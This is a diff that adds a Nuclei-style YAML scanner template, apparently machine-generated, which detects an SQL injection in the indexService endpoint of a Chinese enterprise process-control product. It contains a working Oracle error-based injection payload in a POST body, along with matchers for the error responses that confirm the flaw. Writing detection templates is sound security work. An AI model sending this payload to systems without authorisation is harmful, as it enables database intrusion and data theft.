@@ -1,0 +1,31 @@
+id: poc-yaml-skzy-epcs-indexservice-sqli
+info:
+  name: 时空智友企业流程化管控系统 indexService SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 时空智友企业流程化管控系统 indexService endpoint.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/formservice?service=indexService.notice"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "qzpvq1qzvvq"
+          - "Oracle Text 错误"
+          - "CTXSYS.DRUE"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
